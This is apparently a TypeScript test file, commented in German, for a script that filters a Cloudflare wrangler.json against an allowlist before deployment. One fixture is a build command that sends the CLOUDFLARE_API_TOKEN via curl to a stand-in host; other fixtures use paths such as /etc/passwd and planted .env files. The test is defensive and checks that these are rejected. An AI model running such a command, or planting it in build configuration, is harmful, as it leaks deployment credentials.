// @vitest-environment node
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

/**
 * tools/wrangler-config.py schreibt die wrangler.json aus dem Build per Allowlist neu, bevor
 * `wrangler deploy` mit dem Cloudflare-Token läuft (Sicherheitsbefund PR #8). Die Tests bauen
 * ein künstliches `.output/` und prüfen: ausführbare Schlüssel wie `build.command` verschwinden,
 * Pfade aus dem Artefakt heraus und `.env`-Dateien brechen ab, Name/D1/keep_vars sind fest.
 */
const SKRIPT = join(process.cwd(), "tools", "wrangler-config.py");
const ordner: string[] = [];

function artefakt(konfig: Record<string, unknown>, extra?: (basis: string) => void) {
  const basis = mkdtempSync(join(tmpdir(), "wrangler-config-"));
  ordner.push(basis);
  const output = join(basis, ".output");
  mkdirSync(join(output, "server"), { recursive: true });
  mkdirSync(join(output, "public"), { recursive: true });
  writeFileSync(join(output, "server", "index.mjs"), "export default {};\n");
  writeFileSync(join(output, "server", "wrangler.json"), JSON.stringify(konfig));
  extra?.(basis);
  return { basis, output, ziel: join(basis, "neu.json") };
}

function lauf(output: string, ziel: string) {
  return spawnSync("python3", ["-I", SKRIPT, output, ziel], { encoding: "utf8" });
}

const NITRO = {
  compatibility_date: "2026-11-22",
  main: "index.mjs",
  assets: { binding: "ASSETS", directory: "../public" },
  name: "tanstack-start-ts",
  compatibility_flags: ["nodejs_compat"],
  no_bundle: true,
  rules: [{ type: "ESModule", globs: ["**/*.mjs", "**/*.js"] }],
};

afterEach(() => {
  for (const o of ordner.splice(0)) rmSync(o, { recursive: true, force: true });
});

describe("wrangler-config.py (Allowlist für wrangler.json)", () => {
  it("übernimmt die Nitro-Ausgabe und setzt Name, D1 und keep_vars fest", () => {
    const { output, ziel } = artefakt(NITRO);
    const r = lauf(output, ziel);
    expect(r.status, r.stderr).toBe(0);
    const neu = JSON.parse(readFileSync(ziel, "utf8"));
    expect(neu.name).toBe("nexfiy-ai-studio");
    expect(neu.keep_vars).toBe(true);
    expect(neu.d1_databases).toEqual([
      {
        binding: "DB",
        database_name: "nexify-main",
        database_id: "2dbf4047-20ee-4a68-a258-26ee9eb100e4",
      },
    ]);
    expect(neu.main).toBe(join(output, "server", "index.mjs"));
    expect(neu.assets).toEqual({ binding: "ASSETS", directory: join(output, "public") });
    expect(neu.no_bundle).toBe(true);
  });

  it("verwirft build.command und andere unbekannte Schlüssel und meldet sie", () => {
    const { output, ziel } = artefakt({
      ...NITRO,
      build: { command: "curl https://example.invalid/?t=$CLOUDFLARE_API_TOKEN" },
      env: { staging: { build: { command: "id" } } },
      vars: { X: "1" },
      d1_databases: [{ binding: "DB", database_id: "fremd" }],
      keep_vars: false,
    });
    const r = lauf(output, ziel);
    expect(r.status, r.stderr).toBe(0);
    const neu = JSON.parse(readFileSync(ziel, "utf8"));
    expect(neu).not.toHaveProperty("build");
    expect(neu).not.toHaveProperty("env");
    expect(neu).not.toHaveProperty("vars");
    expect(neu.keep_vars).toBe(true);
    expect(neu.d1_databases[0].database_id).toBe("2dbf4047-20ee-4a68-a258-26ee9eb100e4");
    expect(r.stderr).toContain("Schlüssel verworfen (nicht erlaubt): build");
    expect(readFileSync(ziel, "utf8")).not.toContain("curl");
  });

  it("bricht ab, wenn main aus dem Artefakt herauszeigt", () => {
    const { output, ziel, basis } = artefakt({ ...NITRO, main: "../../x.mjs" }, (b) =>
      writeFileSync(join(b, "x.mjs"), "export default {};\n"),
    );
    const r = lauf(output, ziel);
    expect(r.status).toBe(1);
    expect(r.stderr).toContain("main zeigt aus dem Artefakt heraus");
    expect(() => readFileSync(join(basis, "neu.json"))).toThrow();
  });

  it("bricht bei absolutem main, assets außerhalb und no_bundle false ab", () => {
    for (const konfig of [
      { ...NITRO, main: "/etc/passwd" },
      { ...NITRO, assets: { binding: "ASSETS", directory: "../../" } },
      { ...NITRO, no_bundle: false },
    ]) {
      const { output, ziel } = artefakt(konfig);
      expect(lauf(output, ziel).status).toBe(1);
    }
  });

  it("bricht ab, wenn das Artefakt eine .env oder .wrangler enthält", () => {
    for (const anlegen of [
      (o: string) =>
        writeFileSync(join(o, "server", ".env"), "CLOUDFLARE_API_BASE_URL=https://x\n"),
      (o: string) => mkdirSync(join(o, ".wrangler", "deploy"), { recursive: true }),
      (o: string) => writeFileSync(join(o, "public", ".dev.vars"), "A=1\n"),
    ]) {
      const { output, ziel } = artefakt(NITRO, (b) => anlegen(join(b, ".output")));
      const r = lauf(output, ziel);
      expect(r.status, r.stdout).toBe(1);
      expect(r.stderr).toMatch(/verbotene|verbotenes/);
    }
  });
});
